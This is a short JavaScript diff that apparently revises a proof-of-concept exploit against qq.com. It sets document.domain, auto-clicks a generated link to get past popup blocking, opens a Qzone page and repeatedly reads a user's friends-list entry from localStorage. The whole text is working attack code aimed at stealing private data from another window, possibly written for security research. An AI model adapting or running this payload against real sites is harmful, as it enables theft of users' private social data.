@@ -1,9 +1,9 @@
 document.domain="qq.com";
-function openProxy(){
-  var a = window.open("about:blank");
-  a.onload = function(){
-    a.localStorage.getItem("app_friends_649114132");
-  }
+var a = document.createElement("a");
+a.setAttribute("target","_blank");
+a.onclick = function(){
+  setTimeout('ccc=window.open("https://user.qzone.qq.com/troubleshooter?traytip");setInterval(\'alert(ccc.localStorage.getItem("app_friends_649114132"))\',3000)',1000);
 }
-setTimeout('openProxy()',4000);
-
+a.id="xxx";
+document.body.appendChild(a);
+document.getElementById("xxx").click()
